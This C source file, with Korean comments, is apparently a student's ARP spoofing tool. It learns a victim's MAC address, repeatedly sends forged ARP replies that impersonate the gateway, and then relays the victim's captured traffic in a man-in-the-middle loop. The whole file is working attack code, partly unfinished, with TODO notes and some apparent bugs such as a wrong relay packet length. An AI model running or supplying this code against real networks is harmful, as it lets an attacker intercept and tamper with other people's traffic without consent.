#include "stdafx.h"

u_char myMac[6];
char* interface;

int getMyMac(u_char* myMac, char* _interface){
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(s.ifr_name, _interface);
    if(!ioctl(fd, SIOCGIFHWADDR, &s)){
        for(int i =0; i<6; i++){
            myMac[i] = s.ifr_addr.sa_data[i];
        }
    }
    return 1;
}

int isARP(const uint8_t* pck){
    if((pck[12] == 0x08) && (pck[13] == 0x06))
        return 1;
    else
        return 0;
}

int isRep(const uint8_t* pck){
    char OpIsRep = (pck[20]==0x00 && pck[21]==0x02);
    if(OpIsRep){
        return 1;
    }
    return 0;
}

int isReq(const uint8_t* pck){
    char OpIsRep = (pck[20]==0x00 && pck[21]==0x01);
    if(OpIsRep){
        return 1;
    }
    return 0;
}

void* spoof(void *thr_ptr){

    thread_args* argv = (thread_args*) thr_ptr;

    u_char sender_ip[4];
    u_char gateway_ip[4];

    memcpy(sender_ip, argv->sender_ip, IP_SIZE);
    memcpy(gateway_ip, argv->gateway_ip, IP_SIZE);

    //TODO sender ~~ 이 둘에다가 구조체 값 넣어줘야함

    printf("\n");
    printf("%d.%d.%d.%d\n", sender_ip[0],sender_ip[1],sender_ip[2],sender_ip[3]);

    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s: %s\n", interface, errbuf);
        exit(-1);
    }

    struct pcap_pkthdr* header;
    const uint8_t* packet;
    u_char SenderMAC[6];

    u_char DstMAC[6];
    u_char GateWayMac[6];

    arp_packet arp_data;
    arp_packet rec_pck;
    // 구조체화 시키기
    arp_data.modifySenderMAC(myMac);
    arp_data.modifyTargetIP((u_char*)sender_ip);

    printf("---before sendpacket ---\n");
    pcap_sendpacket(handle, (const u_char*) &(arp_data.data), ARP_PCK_SIZE);
    while(true){
        if(pcap_next_ex(handle, &header, &packet)==0) {
            continue;
        }
        if(isARP(packet) && isReq(packet)){
            rec_pck.initPacket((u_char*)packet);
            memcpy(GateWayMac, rec_pck.getSendMac(), MAC_SIZE);
            // 수행시간 고려하여 if문 안에 둠
            // GateWayMac 에 게이트웨이 MAC Address 저장
        }
        if(isARP(packet) && isRep(packet)){
            // arp reply 패킷 잡음 - Sender MAC을 알아냄
            rec_pck.initPacket((u_char*)packet);
            printf("Caught ARP-Reply packet\n");

            memcpy(SenderMAC, rec_pck.getSendMac(), MAC_SIZE);
            memcpy(DstMAC, rec_pck.getDstMac(), MAC_SIZE);
            break;
        }
    }

    for(int i =0; i<6; i++){
        printf("%X ", SenderMAC[i]);
    }
    printf("\n");
    arp_data.modifyETHSource(myMac);
    arp_data.modifySenderIP((u_char*)gateway_ip);
    arp_data.modifyTargetIP((u_char*)sender_ip);
    arp_data.modifyOP(ARP_REPLY);
    arp_data.modifyTargetMAC(SenderMAC);
    arp_data.modifyETHDestination(SenderMAC);

    printf("Press ^c to Exit.\n");
    for(int i =0;i<30;i++){
        //arp reply패킷 전송
            pcap_sendpacket(handle, (const u_char*) &(arp_data.data), ARP_PCK_SIZE);
        printf("packet send\n");
        sleep(1);
        //TODO sender가
    }

    printf("Relay packet\n");
    //TODO relay packet 작성
    while(true){
        if(pcap_next_ex(handle, &header, &packet)==0){
            continue;
        }
        rec_pck.initPacket((u_char*)packet);
        pcap_sendpacket(handle, (const u_char*) &(arp_data.data), ARP_PCK_SIZE);

        if(memcmp(sender_ip, rec_pck.getSendIP(), IP_SIZE)){
           continue;
        }

        rec_pck.modifyETHSource(myMac);
        rec_pck.modifyTargetMAC(GateWayMac);

        pcap_sendpacket(handle, (const u_char*) &(rec_pck.data), sizeof(packet));
        printf("\n---패킷보냄---\n");


        //TODO 게이트웨이에서 보낸거 다시 받고 수정 거쳐서 sender에게 보낸다.
        // 코드작성후 인터넷이 되는지로 확인
    }
}

int main(int argc, char *argv[]) {
    int NUM_THREADS = (argc-2)/2;
    int rc;
    u_char sender_ip[4];
    u_char gateway_ip[4];


    interface = argv[1];
    if (argc < 4) {
        printf("--Wrong arguments---\n %s <interface> <sender_IP> <gateway_IP> ~~~~~\n", argv[0]);
        return -5;
    }

    // sender_ip와 gateway_ip에 argv값을 전달
    // packet에서 srcMAC를 gateway(target_ip의 MAC)로
    // dstMAC을 sender_ip의 MAC으로
    pthread_t threads[NUM_THREADS];

    getMyMac(myMac, argv[1]);

    thread_args THREAD_ARG[NUM_THREADS];
    printf("NUM_THREADS : %d\n",NUM_THREADS);
    for(int i =1; i<=NUM_THREADS; i++){

        // 23 45 67 89
        printf("-----THREAD %d -----\n", i);
        char *temp;

        temp = strtok(argv[i*2], ".");
        sender_ip[0] = atoi(temp);
        for (int j = 1; j < IP_SIZE; j++) {
            sender_ip[j] = atoi(strtok(NULL, "."));
        }


        temp = strtok(argv[i*2+1], ".");
        gateway_ip[0] = atoi(temp);
        for (int j = 1; j < IP_SIZE; j++) {
            gateway_ip[j] = atoi(strtok(NULL, "."));
        }
        printf("\n");

        memcpy(THREAD_ARG[i-1].sender_ip, sender_ip, IP_SIZE);
        memcpy(THREAD_ARG[i-1].gateway_ip, gateway_ip, IP_SIZE);

        rc = pthread_create(&threads[i-1], NULL, spoof, (void*)&THREAD_ARG[i-1]);

        // 인덱스가 1부터 시작하므로 i-1로 넣음
        if(rc){
            printf("Error: unable to create thread\n");
        }
    }
    for(int i = 0; i<NUM_THREADS; i++)
        pthread_join(threads[i], NULL);
        //스레드 종료전까지 대기.(프로그램 종료를 방지함)
}